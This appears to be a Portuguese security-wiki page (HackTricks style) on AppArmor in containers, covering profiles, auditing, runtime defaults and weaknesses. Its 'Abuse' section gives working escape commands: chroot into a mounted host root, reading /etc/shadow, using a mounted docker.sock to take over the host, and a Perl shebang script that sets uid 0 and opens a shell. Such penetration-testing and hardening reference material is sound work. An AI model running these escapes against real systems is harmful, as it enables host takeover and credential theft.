# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Visão geral

AppArmor é um sistema de **Mandatory Access Control** que aplica restrições por meio de profiles específicos para cada programa. Diferentemente das verificações tradicionais de DAC, que dependem bastante da propriedade de usuários e grupos, o AppArmor permite que o kernel aplique uma policy associada ao próprio processo. Em ambientes de container, isso é importante porque um workload pode ter privilégios tradicionais suficientes para tentar uma ação e ainda assim ser bloqueado, pois seu profile do AppArmor não permite o path, mount, comportamento de rede ou uso de capability relevante.

O ponto conceitual mais importante é que o AppArmor é **baseado em paths**. Ele avalia o acesso ao filesystem por meio de regras de paths, em vez de labels, como faz o SELinux. Isso o torna acessível e poderoso, mas também significa que bind mounts e layouts alternativos de paths exigem atenção cuidadosa. Se o mesmo conteúdo do host se tornar acessível por um path diferente, o efeito da policy pode não ser o que o operador esperava inicialmente.

## Papel no isolamento de containers

As revisões de segurança de containers geralmente param nas capabilities e no seccomp, mas o AppArmor continua sendo importante depois dessas verificações. Imagine um container com mais privilégios do que deveria, ou um workload que precisou de uma capability adicional por razões operacionais. O AppArmor ainda pode restringir o acesso a arquivos, o comportamento de mounts, a rede e os padrões de execução de maneiras que interrompem o caminho óbvio de abuso. É por isso que desabilitar o AppArmor "apenas para fazer a aplicação funcionar" pode transformar silenciosamente uma configuração meramente arriscada em uma configuração ativamente explorável.

## Lab

Para verificar se o AppArmor está ativo no host, use:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Para ver sob qual usuário o processo atual do container está sendo executado:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
A diferença é instrutiva. No caso normal, o processo deve mostrar um contexto do AppArmor vinculado ao perfil escolhido pelo runtime. No caso unconfined, essa camada adicional de restrição desaparece.

Você também pode inspecionar o que o Docker considera ter aplicado:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Uso em Runtime

Docker pode aplicar um perfil AppArmor padrão ou personalizado quando o host oferece suporte a ele. Podman também pode integrar-se ao AppArmor em sistemas baseados em AppArmor, embora, em distribuições que priorizam SELinux, o outro sistema MAC geralmente assuma o papel central. Kubernetes pode expor a política do AppArmor no nível do workload em nodes que realmente oferecem suporte ao AppArmor. LXC e ambientes relacionados de system containers da família Ubuntu também usam AppArmor extensivamente.

O ponto prático é que AppArmor não é um "recurso do Docker". É um recurso do kernel do host que vários runtimes podem optar por aplicar. Se o host não oferecer suporte a ele ou se o runtime for instruído a executar em modo unconfined, a suposta proteção não estará realmente presente.

Especificamente para Kubernetes, a API moderna é `securityContext.appArmorProfile`. Desde o Kubernetes `v1.30`, as antigas annotations beta do AppArmor estão deprecated. Em hosts compatíveis, `RuntimeDefault` é o perfil padrão, enquanto `Localhost` aponta para um perfil que já deve estar carregado no node. Isso é importante durante a revisão, pois um manifest pode parecer compatível com AppArmor e ainda depender inteiramente do suporte no node e de perfis previamente carregados.<sup>[[1]](#references)</sup>

Um detalhe operacional sutil, mas útil, é que definir explicitamente `appArmorProfile.type: RuntimeDefault` é mais rigoroso do que simplesmente omitir o campo. Se o campo for definido explicitamente e o node não oferecer suporte ao AppArmor, a admission deverá falhar. Se o campo for omitido, o workload ainda poderá ser executado em um node sem AppArmor e simplesmente não receber essa camada adicional de confinamento. Do ponto de vista de um atacante, esse é um bom motivo para verificar tanto o manifest quanto o estado real do node.<sup>[[1]](#references)</sup>

Em hosts com suporte ao AppArmor e ao Docker, o padrão mais conhecido é `docker-default`. Esse perfil é gerado a partir do template de AppArmor do Moby e é importante porque explica por que algumas PoCs baseadas em capabilities ainda falham em um container padrão. Em termos gerais, `docker-default` permite networking comum, nega gravações em grande parte de `/proc`, nega acesso a partes sensíveis de `/sys`, bloqueia operações de mount e restringe ptrace para que ele não seja uma primitiva geral de sondagem do host. Entender essa baseline ajuda a diferenciar "o container tem `CAP_SYS_ADMIN`" de "o container pode realmente usar essa capability contra as interfaces do kernel que me interessam".

## Gerenciamento de Perfis

Os perfis do AppArmor geralmente são armazenados em `/etc/apparmor.d/`. Uma convenção comum de nomenclatura é substituir as barras no caminho do executável por pontos. Por exemplo, um perfil para `/usr/bin/man` geralmente é armazenado como `/etc/apparmor.d/usr.bin.man`. Esse detalhe é importante tanto para defesa quanto para assessment, pois, depois de conhecer o nome do perfil ativo, geralmente é possível localizar rapidamente o arquivo correspondente no host.

Comandos úteis de gerenciamento no host incluem:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
A razão pela qual esses comandos são importantes em uma referência de segurança de containers é que eles explicam como os perfis são realmente criados, carregados, alternados para o complain mode e modificados após alterações na aplicação. Se um operador costuma colocar os perfis em complain mode durante a solução de problemas e se esquece de restaurar o enforcement, o container pode parecer protegido na documentação, mas se comportar de maneira muito mais permissiva na prática.

### Criando e atualizando perfis

`aa-genprof` pode observar o comportamento da aplicação e ajudar a gerar um perfil interativamente:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
O `aa-easyprof` pode gerar um perfil de modelo que posteriormente pode ser carregado com `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Quando o binário muda e a política precisa ser atualizada, `aa-logprof` pode reproduzir as negações encontradas nos logs e ajudar o operador a decidir se deve permiti-las ou negá-las:
```bash
sudo aa-logprof
```
### Logs

As negações do AppArmor geralmente são visíveis por meio do `auditd`, syslog ou ferramentas como `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Isso é útil operacionalmente e ofensivamente. Defensores usam isso para refinar profiles. Attackers usam isso para descobrir qual caminho ou operação exato está sendo negado e se o AppArmor é o controle que está bloqueando uma exploit chain.

### Identificando O Arquivo Exato Do Profile

Quando um runtime exibe um nome específico de profile do AppArmor para um container, geralmente é útil mapear esse nome de volta ao arquivo de profile no disco:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Isso é especialmente útil durante a revisão no host, pois conecta a diferença entre "o container informa que está sendo executado sob o profile `lowpriv`" e "as regras reais estão neste arquivo específico, que pode ser auditado ou recarregado".

### Regras de Alto Sinal Para Auditar

Quando você puder ler um profile, não pare em simples linhas `deny`. Vários tipos de regra alteram significativamente a eficácia do AppArmor contra uma tentativa de escape do container:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: executa o binário de destino sem restrições. Se um helper, shell ou interpretador acessível for permitido sob `ux`, isso geralmente é a primeira coisa a testar.
- `px` / `Px` e `cx` / `Cx`: realizam transições de profile durante o exec. Isso não é automaticamente ruim, mas vale a pena auditar, pois uma transição pode levar a um profile muito mais abrangente do que o atual.
- `change_profile`: permite que uma task alterne para outro profile carregado, imediatamente ou no próximo exec. Se o profile de destino for mais fraco, isso pode se tornar a intended escape hatch para sair de um domain restritivo.
- `flags=(complain)`, `flags=(unconfined)` ou o mais recente `flags=(prompt)`: devem alterar o nível de confiança que você deposita no profile. `complain` registra os denials em vez de aplicá-los, `unconfined` remove o limite e `prompt` depende de um caminho de decisão em userspace, em vez de um deny aplicado puramente pelo kernel.
- `userns` ou `userns create,`: as policies mais recentes do AppArmor podem mediar a criação de user namespaces. Se um profile de container permitir isso explicitamente, os user namespaces aninhados continuam em jogo, mesmo quando a plataforma usa o AppArmor como parte de sua estratégia de hardening.

grep útil no host:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Esse tipo de auditoria costuma ser mais útil do que analisar centenas de regras comuns de arquivos. Se um breakout depende da execução de um helper, da entrada em um novo namespace ou da fuga para um profile menos restritivo, a resposta geralmente está oculta nessas regras orientadas a transições, e não nas linhas óbvias no estilo `deny /etc/shadow r`.

## Misconfigurations

O erro mais óbvio é `apparmor=unconfined`. Administradores frequentemente o definem ao depurar uma aplicação que falhou porque o profile bloqueou corretamente algo perigoso ou inesperado. Se a flag permanecer em produção, toda a camada MAC terá sido efetivamente removida.

Outro problema sutil é presumir que bind mounts são inofensivos porque as permissões dos arquivos parecem normais. Como o AppArmor é baseado em paths, expor paths do host sob locais alternativos de montagem pode interagir mal com as regras de paths. Um terceiro erro é esquecer que um nome de profile em um arquivo de configuração significa muito pouco se o kernel do host não estiver realmente aplicando o AppArmor.

## Abuse

Quando o AppArmor desaparece, operações que antes eram restringidas podem funcionar de repente: ler paths sensíveis por meio de bind mounts, acessar partes de procfs ou sysfs que deveriam continuar mais difíceis de usar, executar ações relacionadas a mounts se capabilities/seccomp também permitirem, ou usar paths que um profile normalmente negaria. O AppArmor costuma ser o mecanismo que explica por que uma tentativa de breakout baseada em capabilities "deveria funcionar" no papel, mas ainda assim falha na prática. Remova o AppArmor, e a mesma tentativa poderá começar a funcionar.

Se você suspeita que o AppArmor é o principal fator impedindo uma cadeia de abuso baseada em path-traversal, bind mount ou mount, o primeiro passo geralmente é comparar o que fica acessível com e sem um profile. Por exemplo, se um path do host estiver montado dentro do container, comece verificando se você consegue percorrê-lo e lê-lo:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Se o container também tiver uma capability perigosa, como `CAP_SYS_ADMIN`, um dos testes mais práticos é verificar se o AppArmor é o controle que está bloqueando operações de montagem ou o acesso a sistemas de arquivos sensíveis do kernel:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Em ambientes onde um caminho do host já está disponível por meio de um bind mount, perder o AppArmor também pode transformar um problema de divulgação de informações somente leitura em acesso direto a arquivos do host:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
O objetivo desses comandos não é que o AppArmor, por si só, crie o breakout. É que, uma vez removido o AppArmor, muitos caminhos de abuso baseados em filesystem e mount se tornam imediatamente testáveis.

### Exemplo completo: AppArmor desativado + root do host montado

Se o container já tiver o root do host montado via bind em `/host`, remover o AppArmor pode transformar um caminho de abuso de filesystem bloqueado em um escape completo do host:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Uma vez que o shell esteja executando por meio do sistema de arquivos do host, a workload efetivamente escapou dos limites do container:
```bash
id
hostname
cat /etc/shadow | head
```
### Exemplo completo: AppArmor desativado + Socket de Runtime

Se a verdadeira barreira fosse o AppArmor em torno do estado do runtime, um socket montado poderia ser suficiente para uma fuga completa:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
O caminho exato depende do ponto de montagem, mas o resultado final é o mesmo: o AppArmor não impede mais o acesso à runtime API, e a runtime API pode iniciar um container capaz de comprometer o host.

### Exemplo Completo: Path-Based Bind-Mount Bypass

Como o AppArmor é baseado em caminhos, proteger `/proc/**` não protege automaticamente o mesmo conteúdo do procfs do host quando ele pode ser acessado por um caminho diferente:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
O impacto depende do que exatamente está montado e de a rota alternativa também contornar outros controles, mas esse padrão é uma das razões mais claras pelas quais o AppArmor deve ser avaliado junto com o layout de montagem, e não isoladamente.

### Exemplo completo: Shebang Bypass

A política do AppArmor às vezes direciona um caminho de interpretador de uma forma que não considera totalmente a execução de scripts por meio do tratamento de shebang. Um exemplo histórico envolvia o uso de um script cuja primeira linha aponta para um interpretador confinado:<sup>[[3]](#references)</sup>
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Esse tipo de exemplo é importante como lembrete de que a intenção do profile e a semântica real de execução podem divergir. Ao revisar o AppArmor em ambientes de container, as cadeias de interpretadores e os caminhos alternativos de execução merecem atenção especial.

## Verificações

O objetivo dessas verificações é responder rapidamente a três perguntas: o AppArmor está habilitado no host, o processo atual está confinado e o runtime realmente aplicou um profile a este container?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
O que é interessante aqui:

- Se `/proc/self/attr/current` mostrar `unconfined`, o workload não está se beneficiando do confinamento do AppArmor.
- Se `aa-status` mostrar que o AppArmor está desabilitado ou não carregado, qualquer nome de profile na configuração do runtime é, em grande parte, apenas cosmético.
- Se `docker inspect` mostrar `unconfined` ou um profile customizado inesperado, esse costuma ser o motivo pelo qual um caminho de abuso baseado em filesystem ou mount funciona.
- Se `/sys/kernel/security/apparmor/profiles` não contiver o profile esperado, a configuração do runtime ou do orchestrator, por si só, não é suficiente.
- Se um profile supostamente hardened contiver regras no estilo `ux`, `change_profile` amplo, `userns` ou `flags=(complain)`, o limite prático pode ser muito mais fraco do que o nome do profile sugere.

Se um container já tiver privilégios elevados por razões operacionais, manter o AppArmor habilitado frequentemente faz a diferença entre uma exceção controlada e uma falha de segurança muito mais ampla.

## Padrões do Runtime

| Runtime / plataforma | Estado padrão | Comportamento padrão | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Docker Engine | Habilitado por padrão em hosts compatíveis com AppArmor | Usa o profile AppArmor `docker-default`, salvo substituição | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Depende do host | O AppArmor é compatível por meio de `--security-opt`, mas o padrão exato depende do host/runtime e é menos universal que o profile documentado `docker-default` do Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Padrão condicional | Se `appArmorProfile.type` não for especificado, o padrão será `RuntimeDefault`, mas ele só será aplicado quando o AppArmor estiver habilitado no node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` com um profile fraco, nodes sem suporte ao AppArmor |
| containerd / CRI-O no Kubernetes | Segue o suporte do node/runtime | Runtimes comuns compatíveis com Kubernetes suportam AppArmor, mas a aplicação efetiva ainda depende do suporte do node e das configurações do workload | Igual à linha do Kubernetes; a configuração direta do runtime também pode ignorar completamente o AppArmor |

Para o AppArmor, a variável mais importante costuma ser o **host**, não apenas o runtime. Uma configuração de profile em um manifest não cria confinamento em um node onde o AppArmor não está habilitado.

## Referências

- [1] [Contexto de segurança do Kubernetes: campos do profile AppArmor e comportamento do suporte do node](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Manpage `apparmor.d(5)` do Ubuntu 24.04: transições de exec, `change_profile`, `userns` e flags de profile](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
- [3] [HTB: Nunchucks - bypass de shebang do AppArmor com um script Perl](https://0xdf.gitlab.io/2021/11/02/htb-nunchucks.html)

{{#include ../../../../banners/hacktricks-training.md}}
